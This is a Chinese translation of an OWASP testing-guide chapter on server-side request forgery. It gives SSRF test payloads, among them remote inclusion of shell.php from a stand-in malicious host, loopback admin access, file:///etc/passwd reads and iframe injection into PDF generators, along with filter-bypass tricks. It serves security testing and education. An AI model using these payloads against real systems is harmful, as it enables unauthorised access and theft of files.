# 测试服务器端请求伪造

|ID          |
|------------|
|WSTG-INPV-19|

## 概述

Web应用程序经常与内部或外部资源交互。虽然您可能期望只有目标资源会处理您发送的数据，但处理不当可能导致注入攻击的可能性。一种这样的注入攻击称为服务器端请求伪造（SSRF）。成功的SSRF攻击可以授予攻击者对应用程序或组织内的受限操作、内部服务或内部文件的访问权限。在某些情况下，它甚至可能导致远程代码执行（RCE）。

## 测试目标

- 识别SSRF注入点。
- 测试注入点是否可利用。
- 评估漏洞的严重程度。

## 如何测试

测试SSRF时，您尝试使目标服务器无意中加载或保存可能恶意的内容。最常见的测试是本地和远程文件包含。还有SSRF的另一个方面：一种信任关系经常出现，应用程序服务器能够与用户不能直接访问的其他后端系统交互。这些后端系统通常具有不可路由的私有IP地址或仅限于某些主机。由于它们受网络拓扑保护，它们通常缺乏更复杂的控制。这些内部系统通常包含敏感数据或功能。

考虑以下请求：

``` http
GET https://example.com/page?page=about.php
```

您可以使用以下有效载荷测试此请求。

### 加载文件内容

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### 访问受限页面

```http
GET https://example.com/page?page=http://localhost/admin
```

或者：

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

使用loopback接口访问仅限主机的内容。这意味着如果您有权访问主机，您也有权直接访问`admin`页面。

这种信任关系（其中来自本地机器的请求与普通请求的处理方式不同）通常是SSRF成为严重漏洞的原因。

### 获取本地文件

```http
GET https://example.com/page?page=file:///etc/passwd
```

### 使用的HTTP方法

上述所有有效载荷可以应用于任何类型的HTTP请求，也可以注入到头和cookie值中。

关于带POST请求的SSRF的一个重要说明是，SSRF也可能以盲目的方式表现，因为应用程序可能不会立即返回任何内容。相反，注入的数据可能在其他功能中使用，如PDF报告、发票或订单处理等，这些可能对员工可见，但不一定对最终用户或测试人员可见。

您可以在[此处](https://portswigger.net/web-security/ssrf/blind)找到更多关于盲SSRF的信息，或在[参考资料部分](#参考资料)查看。

### PDF生成器

在某些情况下，服务器可能会将上传的文件转换为PDF格式。尝试注入`<iframe>`、`<img>`、`<base>`或`<script>`元素，或指向内部服务的CSS `url()`函数。

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### 常见过滤器绕过

一些应用程序阻止对`localhost`和`127.0.0.1`的引用。可以通过以下方式绕过：

- 使用评估为`127.0.0.1`的替代IP表示：
  - 点分十进制表示法：`2130706433`
  - 八进制表示法：`017700000001`
  - IP缩短：`127.1`
- 字符串混淆
- 注册解析为`127.0.0.1`您自己的域

有时应用程序允许匹配某个表达式的输入，如域名。如果URL模式解析器未正确实现，则可能导致类似于[语义攻击](https://tools.ietf.org/html/rfc3986#section-7.6)的攻击。

- 使用`@`字符在userinfo和host之间分隔：`https://expected-domain@attacker-domain`
- 使用`#`字符的URL分段：`https://attacker-domain#expected-domain`
- URL编码
- 模糊测试
- 以上所有组合

有关其他有效载荷和绕过技术，请参阅[参考资料](#参考资料)部分。

## 修复

SSRF被称为最难防御的攻击之一，如果不使用需要允许特定IP和URL的允许列表。请阅读[服务器端请求伪造防范速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)以了解更多关于SSRF预防的信息。

## 参考资料

- [swisskyrepo：SSRF有效载荷](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [使用SSRF漏洞读取内部文件](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [使用SSRF漏洞滥用AWS元数据服务](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP服务器端请求伪造防范速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger：SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger：盲SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd网络研讨会：SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
- [Hackerone博客：SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101：SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [URI通用语法](https://tools.ietf.org/html/rfc3986)
